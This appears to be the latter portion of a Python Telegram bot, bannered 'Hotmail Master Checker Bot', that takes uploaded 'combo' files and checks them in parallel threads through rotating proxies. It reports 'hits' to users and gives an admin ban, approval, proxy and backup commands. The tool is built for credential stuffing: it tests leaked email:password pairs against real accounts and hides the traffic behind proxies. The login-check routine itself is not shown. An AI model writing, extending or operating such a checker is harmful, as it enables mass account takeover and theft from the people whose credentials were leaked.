{E_CHART} Total Checked: {mono(str(g.get('total_checked', 0)))}
{E_FIRE} Total Hits: {mono(str(g.get('total_hits', 0)))}

{E_CROWN} {italic('Dev: @BaignX')}
{E_HEART} {italic('Enjoy using the bot!')}"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_ROCKET} Checker", callback_data="open_checker"),
        types.InlineKeyboardButton(f"{E_USER} My Profile", callback_data="my_profile"),
    )
    markup.add(
        types.InlineKeyboardButton(f"{E_GLOBE} Bot Status", callback_data="bot_status"),
        types.InlineKeyboardButton(f"{E_CROSS} Exit", callback_data="exit_bot"),
    )

    try:
        # If the current message is a photo, we need to delete and resend
        if call.message.content_type == 'photo':
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, welcome_text, parse_mode="HTML",
                           reply_markup=markup, disable_web_page_preview=True)
        else:
            bot.edit_message_text(
                welcome_text, call.message.chat.id, call.message.message_id,
                parse_mode="HTML", reply_markup=markup, disable_web_page_preview=True
            )
    except:
        bot.send_message(call.message.chat.id, welcome_text, parse_mode="HTML",
                        reply_markup=markup, disable_web_page_preview=True)
    bot.answer_callback_query(call.id)


# ══════════════════════════════════════════════════════════
#  FILE HANDLER (Combo file)
# ══════════════════════════════════════════════════════════

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user = message.from_user
    db_inst = load_db()
    update_user_info(db_inst, user)

    banned, reason = is_banned(db_inst, user.id)
    if banned:
        bot.reply_to(message, f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason)}", parse_mode="HTML")
        return

    # Admin can run multiple checks simultaneously
    is_admin = user.id == ADMIN_ID
    with active_checks_lock:
        if user.id in active_checks and not is_admin:
            bot.reply_to(message, f"{E_WARN} {bold('You already have an active check running!')}\n{italic('Wait for it to finish or stop it first.')}", parse_mode="HTML")
            return

    doc = message.document
    if not doc.file_name.endswith('.txt'):
        bot.reply_to(message, f"{E_CROSS} {bold('Only .txt files are supported!')}", parse_mode="HTML")
        return

    if doc.file_size > MAX_FILE_SIZE_MB * 1024 * 1024:
        bot.reply_to(message, f"{E_CROSS} {bold(f'File too large! Max {MAX_FILE_SIZE_MB}MB')}", parse_mode="HTML")
        return

    # Loading effect
    loading_msg = bot.reply_to(message, f"{E_HOURGLASS} {bold('Loading file...')} {E_GEAR}", parse_mode="HTML")

    try:
        file_info = bot.get_file(doc.file_id)
        file_content = bot.download_file(file_info.file_path)
        lines = file_content.decode("utf-8", errors="ignore").splitlines()
    except Exception as e:
        bot.edit_message_text(f"{E_CROSS} Error reading file: {mono(str(e))}", loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML")
        return

    combos, total_lines, bad_lines = parse_combos(lines)
    valid = len(combos)
    approved = is_approved(db_inst, user.id) or is_admin

    # Admin has no line limit
    over_limit = not approved and total_lines > MAX_LINES

    # Update loading message with summary
    summary_text = f"""{E_FILE} {bold('File Summary')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_MEMO} File: {mono(doc.file_name)}
{E_CHART} Total Lines: {mono(str(total_lines))}
{E_CHECK} Valid Combos: {mono(str(valid))}
{E_CROSS} Invalid/Skipped: {mono(str(bad_lines))}
{E_BOLT} Threads: {mono(str(DEFAULT_THREADS))}
{E_GLOBE} Proxies: {mono(str(len(init_proxies())))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"""

    if over_limit:
        summary_text += f"""
{E_WARN} {bold(f'More than {MAX_LINES} lines detected!')}
{E_MEMO} Only first {MAX_LINES} lines will be processed."""

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{E_PLAY} Proceed (First {MAX_LINES})", callback_data=f"proceed_check_{user.id}"),
            types.InlineKeyboardButton(f"{E_STOP} Abort", callback_data=f"abort_check_{user.id}")
        )

        # Trim combos
        combos = combos[:MAX_LINES]
        valid = len(combos)
    else:
        if valid == 0:
            bot.edit_message_text(f"{E_CROSS} {bold('No valid combos found in file!')}", loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML")
            return

        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{E_PLAY} Start Checking", callback_data=f"proceed_check_{user.id}"),
            types.InlineKeyboardButton(f"{E_STOP} Abort", callback_data=f"abort_check_{user.id}")
        )

    summary_text += f"\n{E_GEAR} {italic('Dev: @BaignX')}"

    bot.edit_message_text(summary_text, loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML", reply_markup=markup)

    # Store pending check data
    with active_checks_lock:
        active_checks[f"pending_{user.id}"] = {
            "combos": combos,
            "total_lines": total_lines,
            "bad_lines": bad_lines,
            "message": message,
            "loading_msg_id": loading_msg.message_id,
        }


@bot.callback_query_handler(func=lambda call: call.data.startswith("proceed_check_"))
def cb_proceed_check(call):
    user = call.from_user
    uid = int(call.data.split("_")[-1])
    if user.id != uid:
        bot.answer_callback_query(call.id, "Not your check!", show_alert=True)
        return

    with active_checks_lock:
        pending_key = f"pending_{uid}"
        if pending_key not in active_checks:
            bot.answer_callback_query(call.id, "No pending check found!", show_alert=True)
            return
        if uid in active_checks:
            bot.answer_callback_query(call.id, "Already checking!", show_alert=True)
            return
        pending = active_checks.pop(pending_key)

    combos = pending["combos"]
    total_lines = pending["total_lines"]
    bad_lines = pending["bad_lines"]
    orig_message = pending["message"]

    # Delete the summary message
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass

    cs = CheckerSession(uid, combos, total_lines, bad_lines)

    with active_checks_lock:
        active_checks[uid] = cs

    # Start checker in background
    t = threading.Thread(target=run_checker, args=(cs, orig_message, call.from_user), daemon=True)
    t.start()

    bot.answer_callback_query(call.id, f"Checking started! {DEFAULT_THREADS} threads")


@bot.callback_query_handler(func=lambda call: call.data.startswith("abort_check_"))
def cb_abort_check(call):
    user = call.from_user
    uid = int(call.data.split("_")[-1])
    if user.id != uid:
        bot.answer_callback_query(call.id, "Not your check!", show_alert=True)
        return

    with active_checks_lock:
        pending_key = f"pending_{uid}"
        if pending_key in active_checks:
            del active_checks[pending_key]

    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass

    bot.send_message(call.message.chat.id,
                     f"{E_STOP} {bold('Check aborted!')}\n{E_GEAR} {italic('Dev: @BaignX')}",
                     parse_mode="HTML")
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("get_hits_"))
def cb_get_hits(call):
    user = call.from_user
    uid = int(call.data.split("_")[-1])
    if user.id != uid:
        bot.answer_callback_query(call.id, "Not your check!", show_alert=True)
        return

    with active_checks_lock:
        cs = active_checks.get(uid)

    if not cs:
        bot.answer_callback_query(call.id, "No active check found!", show_alert=True)
        return

    hits_text = build_hits_text(cs)
    if len(hits_text) > 4000:
        # Send as file
        try:
            f = io.BytesIO(hits_text.encode("utf-8"))
            f.name = "current_hits.txt"
            bot.send_document(
                call.message.chat.id, f,
                caption=f"{E_FIRE} {bold('Current Hits')} ({len(cs.stats.all_hits)} total)\n{E_GEAR} {italic('Dev: @BaignX')}",
                parse_mode="HTML",
                reply_to_message_id=call.message.message_id
            )
        except:
            pass
    else:
        if hits_text == "No hits found yet.":
            bot.answer_callback_query(call.id, "No hits found yet!", show_alert=True)
            return
        bot.send_message(
            call.message.chat.id,
            f"{E_FIRE} {bold('Current Hits:')}\n\n{pre(hits_text)}\n\n{E_GEAR} {italic('Dev: @BaignX')}",
            parse_mode="HTML",
            reply_to_message_id=call.message.message_id
        )

    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_check_"))
def cb_stop_check(call):
    user = call.from_user
    uid = int(call.data.split("_")[-1])
    if user.id != uid:
        bot.answer_callback_query(call.id, "Not your check!", show_alert=True)
        return

    with active_checks_lock:
        cs = active_checks.get(uid)

    if not cs:
        bot.answer_callback_query(call.id, "No active check found!", show_alert=True)
        return

    cs.stop_event.set()
    bot.answer_callback_query(call.id, "Stopping... Please wait.")


# ══════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ══════════════════════════════════════════════════════════

@bot.message_handler(commands=['adm'])
def cmd_adm(message):
    if message.from_user.id != ADMIN_ID:
        return

    text = f"""{E_CROWN} <b>Admin Panel</b>
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501

{E_GEAR} <b>Available Commands:</b>

{E_BAN} <code>/ban &lt;user_id&gt; &lt;reason&gt; [days]</code>
   Ban a user (empty days = lifetime)

{E_UNLOCK} <code>/unban &lt;user_id&gt; [reason]</code>
   Unban a user

{E_CHECK} <code>/approve &lt;user_id&gt; [days]</code>
   Remove line limit for user

{E_CROSS} <code>/demote &lt;user_id&gt;</code>
   Demote user to normal rank

{E_BELL} <code>/broadcast</code>
   Reply to a message to broadcast

{E_CHART} <code>/status</code>
   Full bot statistics

{E_GLOBE} <code>/get_proxies</code>
   Get current proxy list

{E_BOLT} <code>/addproxy &lt;proxy&gt;</code>
   Add a proxy (auto-tested)

{E_GEAR} <code>/updatep</code>
   Reply to proxy file to update all

{E_SHIELD} <code>/test</code>
   Test all proxies

{E_FILE} <code>/fetch</code>
   Get database backup

\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} <i>Dev: @BaignX</i>"""

    bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split(maxsplit=3)
    if len(parts) < 3:
        bot.reply_to(message, f"{E_WARN} Usage: <code>/ban &lt;user_id&gt; &lt;reason&gt; [days]</code>", parse_mode="HTML")
        return

    try:
        target_id = int(parts[1])
    except:
        bot.reply_to(message, f"{E_CROSS} Invalid user ID!", parse_mode="HTML")
        return

    reason = parts[2] if len(parts) > 2 else "No reason"
    days = None
    if len(parts) > 3:
        try:
            days = int(parts[3])
        except:
            pass

    db_inst = load_db()
    db_inst.setdefault("banned", {})[str(target_id)] = {
        "reason": reason,
        "days": days,
        "date": datetime.now().isoformat(),
        "by": ADMIN_ID
    }
    save_db(db_inst)

    duration = f"{days} days" if days else "Lifetime"
    bot.reply_to(message, f"""{E_BAN} {bold('User Banned!')}
{E_USER} User ID: {mono(str(target_id))}
{E_MEMO} Reason: {mono(reason)}
{E_CLOCK} Duration: {mono(duration)}""", parse_mode="HTML")

    # Notify user
    try:
        bot.send_message(target_id, f"""{E_BAN} {bold('You have been banned!')}
{E_MEMO} Reason: {mono(reason)}
{E_CLOCK} Duration: {mono(duration)}
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except:
        pass


@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, f"{E_WARN} Usage: <code>/unban &lt;user_id&gt; [reason]</code>", parse_mode="HTML")
        return

    try:
        target_id = int(parts[1])
    except:
        bot.reply_to(message, f"{E_CROSS} Invalid user ID!", parse_mode="HTML")
        return

    reason = parts[2] if len(parts) > 2 else "No reason"

    db_inst = load_db()
    if str(target_id) in db_inst.get("banned", {}):
        del db_inst["banned"][str(target_id)]
        save_db(db_inst)

    bot.reply_to(message, f"""{E_UNLOCK} {bold('User Unbanned!')}
{E_USER} User ID: {mono(str(target_id))}
{E_MEMO} Reason: {mono(reason)}""", parse_mode="HTML")

    try:
        bot.send_message(target_id, f"""{E_UNLOCK} {bold('You have been unbanned!')}
{E_MEMO} Reason: {mono(reason)}
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except:
        pass


@bot.message_handler(commands=['approve'])
def cmd_approve(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, f"{E_WARN} Usage: <code>/approve &lt;user_id&gt; [days]</code>", parse_mode="HTML")
        return

    try:
        target_id = int(parts[1])
    except:
        bot.reply_to(message, f"{E_CROSS} Invalid user ID!", parse_mode="HTML")
        return

    days = None
    if len(parts) > 2:
        try:
            days = int(parts[2])
        except:
            pass

    db_inst = load_db()
    db_inst.setdefault("approved", {})[str(target_id)] = {
        "days": days,
        "date": datetime.now().isoformat(),
        "by": ADMIN_ID
    }
    save_db(db_inst)

    duration = f"{days} days" if days else "Lifetime"
    bot.reply_to(message, f"""{E_CROWN} {bold('User Approved!')}
{E_USER} User ID: {mono(str(target_id))}
{E_CLOCK} Duration: {mono(duration)}
{E_MEMO} Line limit removed""", parse_mode="HTML")

    try:
        bot.send_message(target_id, f"""{E_CROWN} {bold('You have been approved!')}
{E_SPARKLE} Line limit has been removed!
{E_CLOCK} Duration: {mono(duration)}
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except:
        pass


@bot.message_handler(commands=['demote'])
def cmd_demote(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, f"{E_WARN} Usage: <code>/demote &lt;user_id&gt;</code>", parse_mode="HTML")
        return

    try:
        target_id = int(parts[1])
    except:
        bot.reply_to(message, f"{E_CROSS} Invalid user ID!", parse_mode="HTML")
        return

    db_inst = load_db()
    if str(target_id) in db_inst.get("approved", {}):
        del db_inst["approved"][str(target_id)]
        save_db(db_inst)

    bot.reply_to(message, f"""{E_CROSS} {bold('User Demoted!')}
{E_USER} User ID: {mono(str(target_id))}
{E_MEMO} Rank set to Normal""", parse_mode="HTML")

    try:
        bot.send_message(target_id, f"""{E_CROSS} {bold('You have been demoted to normal rank.')}
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except:
        pass


@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return

    if not message.reply_to_message:
        bot.reply_to(message, f"{E_WARN} Reply to a message to broadcast it!", parse_mode="HTML")
        return

    db_inst = load_db()
    users = list(db_inst.get("users", {}).keys())
    total = len(users)
    sent = 0
    failed = 0

    progress_msg = bot.reply_to(message, f"{E_BELL} Broadcasting... 0/{total}", parse_mode="HTML")

    for uid in users:
        try:
            bot.copy_message(int(uid), message.chat.id, message.reply_to_message.message_id)
            sent += 1
        except:
            failed += 1

        if (sent + failed) % 10 == 0:
            try:
                pbar = make_progress_bar(sent + failed, total, 15)
                bot.edit_message_text(
                    f"{E_BELL} {bold('Broadcasting...')}\n{mono(pbar)}\n{E_CHECK} Sent: {sent} | {E_CROSS} Failed: {failed}",
                    progress_msg.chat.id, progress_msg.message_id, parse_mode="HTML"
                )
            except:
                pass

    bot.edit_message_text(
        f"""{E_BELL} {bold('Broadcast Complete!')}
{E_CHECK} Sent: {mono(str(sent))}
{E_CROSS} Failed: {mono(str(failed))}
{E_CHART} Total: {mono(str(total))}
{mono(make_progress_bar(total, total, 15))}""",
        progress_msg.chat.id, progress_msg.message_id, parse_mode="HTML"
    )


@bot.message_handler(commands=['status'])
def cmd_status(message):
    if message.from_user.id != ADMIN_ID:
        return

    db_inst = load_db()
    uptime = time.time() - BOT_START_TIME
    uptime_str = time.strftime("%Hh %Mm %Ss", time.gmtime(uptime))
    total_users = len(db_inst.get("users", {}))
    banned_users = len(db_inst.get("banned", {}))
    approved_users = len(db_inst.get("approved", {}))
    g = db_inst.get("global_stats", {})
    total_proxies = len(init_proxies())

    with active_checks_lock:
        current_checks = len([k for k in active_checks if not str(k).startswith("pending_")])

    text = f"""{E_CHART} {bold('Admin Status Panel')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GREEN} Status: {mono('Online')}
{E_CLOCK} Uptime: {mono(uptime_str)}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_USER} {bold('Users:')}
{E_CHECK} Total Users: {mono(str(total_users))}
{E_BAN} Banned Users: {mono(str(banned_users))}
{E_CROWN} Approved Users: {mono(str(approved_users))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_CHART} {bold('Global Stats:')}
{E_CHECK} Total Checked: {mono(str(g.get('total_checked', 0)))}
{E_FIRE} Total Hits: {mono(str(g.get('total_hits', 0)))}
{E_FILE} Total Lines: {mono(str(g.get('total_lines_checked', 0)))}
{E_BOLT} Current Checks: {mono(str(current_checks))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GLOBE} Proxies: {mono(str(total_proxies))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic('Dev: @BaignX')}"""

    bot.reply_to(message, text, parse_mode="HTML")


@bot.message_handler(commands=['get_proxies'])
def cmd_get_proxies(message):
    if message.from_user.id != ADMIN_ID:
        return

    proxies = init_proxies()
    content = "\n".join(proxies)
    f = io.BytesIO(content.encode("utf-8"))
    f.name = "proxies.txt"
    bot.send_document(message.chat.id, f,
                     caption=f"{E_GLOBE} {bold('Current Proxies')} ({len(proxies)} total)\n{E_GEAR} {italic('Dev: @BaignX')}",
                     parse_mode="HTML", reply_to_message_id=message.message_id)


@bot.message_handler(commands=['addproxy'])
def cmd_addproxy(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, f"{E_WARN} Usage: <code>/addproxy &lt;proxy&gt;</code>\nFormats: <code>ip:port:user:pass</code> or <code>user:pass@ip:port</code>", parse_mode="HTML")
        return

    proxy_str = parts[1].strip()
    testing_msg = bot.reply_to(message, f"{E_HOURGLASS} Testing proxy...", parse_mode="HTML")

    # Test twice
    alive = False
    for _ in range(2):
        if test_single_proxy(proxy_str):
            alive = True
            break
        time.sleep(1)

    if alive:
        proxies = init_proxies()
        if proxy_str not in proxies:
            proxies.append(proxy_str)
            save_proxies_to_file(proxies)
        bot.edit_message_text(
            f"{E_CHECK} {bold('Proxy added successfully!')}\n{E_GLOBE} Proxy: {mono(proxy_str)}\n{E_GREEN} Status: Live",
            testing_msg.chat.id, testing_msg.message_id, parse_mode="HTML"
        )
    else:
        bot.edit_message_text(
            f"{E_CROSS} {bold('Proxy is dead!')}\n{E_GLOBE} Proxy: {mono(proxy_str)}\n{E_RED} Status: Dead - Not added",
            testing_msg.chat.id, testing_msg.message_id, parse_mode="HTML"
        )


@bot.message_handler(commands=['updatep'])
def cmd_updatep(message):
    if message.from_user.id != ADMIN_ID:
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, f"{E_WARN} Reply to a proxy .txt file to update!", parse_mode="HTML")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        lines = file_content.decode("utf-8", errors="ignore").splitlines()
        new_proxies = [l.strip() for l in lines if l.strip()]
        save_proxies_to_file(new_proxies)

        bot.reply_to(message, f"""{E_CHECK} {bold('Proxies Updated!')}
{E_GLOBE} Total proxies: {mono(str(len(new_proxies)))}
{E_MEMO} Old proxies removed
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"{E_CROSS} Error: {mono(str(e))}", parse_mode="HTML")


@bot.message_handler(commands=['test'])
def cmd_test_proxies(message):
    if message.from_user.id != ADMIN_ID:
        return

    proxies = init_proxies()
    total = len(proxies)
    if total == 0:
        bot.reply_to(message, f"{E_CROSS} No proxies to test!", parse_mode="HTML")
        return

    progress_msg = bot.reply_to(message, f"{E_HOURGLASS} Testing {total} proxies...", parse_mode="HTML")

    alive_list = []
    dead_list = []
    tested = 0
    test_lock = threading.Lock()

    def test_one(p):
        nonlocal tested
        result = test_single_proxy(p)
        with test_lock:
            tested += 1
            if result:
                alive_list.append(p)
            else:
                dead_list.append(p)

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(test_one, p) for p in proxies]
        last_update = 0
        for f in as_completed(futs):
            now = time.time()
            if now - last_update > 3:
                last_update = now
                try:
                    pbar = make_progress_bar(tested, total, 15)
                    bot.edit_message_text(
                        f"{E_HOURGLASS} {bold('Testing proxies...')}\n{mono(pbar)}\n{E_GREEN} Alive: {len(alive_list)} | {E_RED} Dead: {len(dead_list)}",
                        progress_msg.chat.id, progress_msg.message_id, parse_mode="HTML"
                    )
                except:
                    pass

    # Build result
    summary_lines = [
        f"Proxy Test Results",
        f"Total: {total}",
        f"Alive: {len(alive_list)}",
        f"Dead: {len(dead_list)}",
        f"",
        f"=== ALIVE ===",
    ]
    for p in alive_list:
        summary_lines.append(p)
    summary_lines.append("")
    summary_lines.append("=== DEAD ===")
    for p in dead_list:
        summary_lines.append(p)

    f = io.BytesIO("\n".join(summary_lines).encode("utf-8"))
    f.name = "proxy_test_results.txt"

    bot.edit_message_text(
        f"""{E_SHIELD} {bold('Proxy Test Complete!')}
{E_GREEN} Alive: {mono(str(len(alive_list)))}
{E_RED} Dead: {mono(str(len(dead_list)))}
{E_CHART} Total: {mono(str(total))}
{mono(make_progress_bar(total, total, 15))}""",
        progress_msg.chat.id, progress_msg.message_id, parse_mode="HTML"
    )

    bot.send_document(message.chat.id, f,
                     caption=f"{E_SHIELD} Proxy test results\n{E_GEAR} {italic('Dev: @BaignX')}",
                     parse_mode="HTML")


@bot.message_handler(commands=['fetch'])
def cmd_fetch(message):
    if message.from_user.id != ADMIN_ID:
        return

    send_backup(message.chat.id, "Manual backup requested")


def send_backup(chat_id, reason=""):
    try:
        db_inst = load_db()
        g = db_inst.get("global_stats", {})
        total_users = len(db_inst.get("users", {}))

        # Create backup zip
        tmpdir = tempfile.mkdtemp(prefix="backup_")
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        # Copy DB
        if os.path.exists(DB_FILE):
            shutil.copy2(DB_FILE, os.path.join(tmpdir, DB_FILE))

        # Copy proxies
        if os.path.exists(PROXIES_FILE):
            shutil.copy2(PROXIES_FILE, os.path.join(tmpdir, PROXIES_FILE))

        # Info file
        with open(os.path.join(tmpdir, "backup_info.txt"), "w") as f:
            f.write(f"Backup Date: {ts}\n")
            f.write(f"Reason: {reason}\n")
            f.write(f"Total Users: {total_users}\n")
            f.write(f"Total Checked: {g.get('total_checked', 0)}\n")
            f.write(f"Total Hits: {g.get('total_hits', 0)}\n")
            f.write(f"Bot by @BaignX\n")

        zip_path = os.path.join(tmpdir, f"backup_{ts}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for fn in os.listdir(tmpdir):
                fp = os.path.join(tmpdir, fn)
                if fp != zip_path:
                    zf.write(fp, fn)

        with open(zip_path, 'rb') as f:
            bot.send_document(
                chat_id, f,
                caption=f"""{E_FILE} {bold('Database Backup')}
{E_CLOCK} {mono(ts)}
{E_MEMO} {reason}
{E_USER} Users: {mono(str(total_users))}
{E_CHART} Checked: {mono(str(g.get('total_checked', 0)))}
{E_FIRE} Hits: {mono(str(g.get('total_hits', 0)))}
{E_GEAR} {italic('Dev: @BaignX')}""",
                parse_mode="HTML"
            )

        shutil.rmtree(tmpdir)
    except Exception as e:
        try:
            bot.send_message(chat_id, f"{E_CROSS} Backup error: {mono(str(e))}", parse_mode="HTML")
        except:
            pass


# ══���═══════════════════════════════════════════════════════
#  AUTO BACKUP THREAD
# ══════════════════════════════════════════════════════════

def auto_backup_loop():
    # Send initial backup on start
    time.sleep(5)
    send_backup(ADMIN_ID, "Bot started - initial backup")

    while True:
        time.sleep(BACKUP_INTERVAL)
        send_backup(ADMIN_ID, "Scheduled 24h backup")


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

def main():
    # Init files
    init_proxies()
    load_db()

    print(f"""
 ╔══════════════════════════════════════════════╗
 ║     Hotmail Master Checker Bot               ║
 ║     Dev: @BaignX                             ║
 ║     Admin ID: {ADMIN_ID}                    ║
 ╚══════════════════════════════════════════════╝
    """)

    # Start auto backup
    backup_thread = threading.Thread(target=auto_backup_loop, daemon=True)
    backup_thread.start()

    # Start bot
    print("[*] Bot starting...")
    try:
        bot.send_message(ADMIN_ID, f"""{E_ROBOT} {bold('Bot Started!')}
{E_GREEN} Status: Online
{E_CLOCK} Time: {mono(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}
{E_GLOBE} Proxies: {mono(str(len(init_proxies())))}
{E_USER} DB Users: {mono(str(len(load_db().get('users', {}))))}
{E_GEAR} {italic('Dev: @BaignX')}""", parse_mode="HTML")
    except:
        pass

    print("[*] Bot is running!")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)


if __name__ == "__main__":
    main()
